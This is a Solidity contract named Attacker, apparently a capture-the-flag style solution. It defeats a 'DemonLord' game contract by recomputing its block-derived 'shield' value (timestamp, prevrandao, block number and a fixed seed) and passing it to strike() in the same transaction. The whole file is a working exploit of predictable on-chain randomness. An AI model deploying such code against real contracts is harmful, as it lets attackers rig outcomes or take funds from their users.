// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IDemonLord {
    function strike(uint256 _heroAttackPower) external;
}

contract Attacker {
    IDemonLord public target;

    constructor(address _target) {
        target = IDemonLord(_target);
    }

    function attack() external {
        uint256 shield = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.prevrandao,
                    block.number,
                    uint256(8273649123)
                )
            )
        );

        target.strike(shield);
    }
}
